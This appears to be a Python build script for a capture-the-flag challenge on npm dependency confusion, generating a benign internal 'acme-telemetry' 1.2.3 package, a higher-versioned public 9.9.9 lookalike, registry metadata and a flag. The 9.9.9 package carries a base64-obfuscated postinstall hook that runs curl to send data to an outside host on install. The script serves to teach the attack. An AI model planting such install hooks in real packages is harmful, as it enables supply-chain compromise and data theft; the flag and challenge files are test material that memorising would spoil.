#!/usr/bin/env python3
"""Generate the dependency-confusion artifact bundle.

Two registry metadata dumps are shipped for the same package name
(`acme-telemetry`): one from the company's *internal* registry and one from
the *public* npm registry. The public registry advertises a much higher
version whose tarball carries a malicious `postinstall` hook. The hook
base64-decodes an exfil payload that embeds the flag.
"""

import base64
import gzip
import hashlib
import io
import json
import os
import tarfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.dirname(HERE)

FLAG = "NCTF{d3p_c0nfusion_higher_version_wins_a1f7}"


def make_npm_tarball(path, files):
    """Write a gzipped tar where every entry lives under package/ (npm style)."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        for name, data in files.items():
            info = tarfile.TarInfo("package/" + name)
            info.size = len(data)
            info.mtime = 0
            tar.addfile(info, io.BytesIO(data))
    body = gzip.compress(raw.getvalue(), mtime=0)
    with open(path, "wb") as fh:
        fh.write(body)
    return hashlib.sha1(body).hexdigest()


def build():
    # Benign internal 1.2.3 -----------------------------------------------
    benign_pkg = json.dumps(
        {
            "name": "acme-telemetry",
            "version": "1.2.3",
            "description": "Internal telemetry client for ACME services.",
            "main": "index.js",
            "scripts": {"test": "node test.js"},
        },
        indent=2,
    ).encode()
    benign_index = b"module.exports = function report(ev){ /* send to metrics */ };\n"
    benign_files = {"package.json": benign_pkg, "index.js": benign_index}
    benign_sha = make_npm_tarball(
        os.path.join(OUT, "acme-telemetry-1.2.3.tgz"), benign_files
    )

    # Malicious public 9.9.9 ----------------------------------------------
    # The postinstall decodes this and POSTs it "home". It contains the flag.
    exfil = "curl -s https://collect.acme-metrics.dev/i?d=" + FLAG
    payload_b64 = base64.b64encode(exfil.encode()).decode()
    postinstall = "node -e \"require('child_process').execSync(" + (
        f"Buffer.from('{payload_b64}','base64').toString())\""
    )
    mal_pkg = json.dumps(
        {
            "name": "acme-telemetry",
            "version": "9.9.9",
            "description": "Internal telemetry client for ACME services.",
            "main": "index.js",
            "scripts": {"postinstall": postinstall},
        },
        indent=2,
    ).encode()
    mal_index = b"module.exports = function report(ev){ /* send to metrics */ };\n"
    mal_files = {"package.json": mal_pkg, "index.js": mal_index}
    mal_sha = make_npm_tarball(os.path.join(OUT, "acme-telemetry-9.9.9.tgz"), mal_files)

    # Internal registry metadata -----------------------------------------
    internal = {
        "name": "acme-telemetry",
        "dist-tags": {"latest": "1.2.3"},
        "versions": {
            "1.2.1": {"version": "1.2.1"},
            "1.2.3": {
                "version": "1.2.3",
                "dist": {
                    "tarball": "https://npm.internal.acme.corp/acme-telemetry/-/acme-telemetry-1.2.3.tgz",
                    "shasum": benign_sha,
                },
            },
        },
        "_registry": "https://npm.internal.acme.corp",
    }

    public = {
        "name": "acme-telemetry",
        "dist-tags": {"latest": "9.9.9"},
        "versions": {
            "9.9.9": {
                "version": "9.9.9",
                "dist": {
                    "tarball": "https://registry.npmjs.org/acme-telemetry/-/acme-telemetry-9.9.9.tgz",
                    "shasum": mal_sha,
                },
            }
        },
        "time": {"9.9.9": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(0))},
        "_registry": "https://registry.npmjs.org",
    }

    with open(os.path.join(OUT, "registry-internal.json"), "w") as fh:
        json.dump(internal, fh, indent=2)
        fh.write("\n")
    with open(os.path.join(OUT, "registry-public.json"), "w") as fh:
        json.dump(public, fh, indent=2)
        fh.write("\n")

    print("built dependency-confusion artifacts")


if __name__ == "__main__":
    build()
